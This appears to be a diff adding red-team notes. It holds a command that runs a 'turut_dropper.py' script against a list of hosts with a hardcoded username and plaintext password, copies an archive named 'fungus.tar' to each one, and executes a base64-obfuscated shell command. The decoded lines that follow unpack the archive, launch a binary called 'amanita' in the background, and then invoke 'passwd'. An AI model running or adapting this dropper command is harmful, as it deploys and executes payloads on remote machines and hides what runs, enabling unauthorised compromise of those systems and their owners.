@@ -1,0 +1,7 @@
+python turut_dropper.py -i hosts -u zathras -p password1! -l /root/Documents/0x80/red/case_studies/turut/pkg/fungus.tar -r /home/zathras/fungus.tar -c 'echo dGFyIC14dmYgL2hvbWUvemF0aHJhcy9mdW5ndXMudGFyCi9ob21lL3phdGhyYXMvZnVuZ3VzL2FtYW5pdGEgJgpzbGVlcCAxNSAmJiBwYXNzd2QgJgo= | base64 -d | sh' &
+
+
+ tar -xvf /home/zathras/fungus.tar
+ /home/zathras/fungus/amanita &
+ sleep 15;
+ passwd &
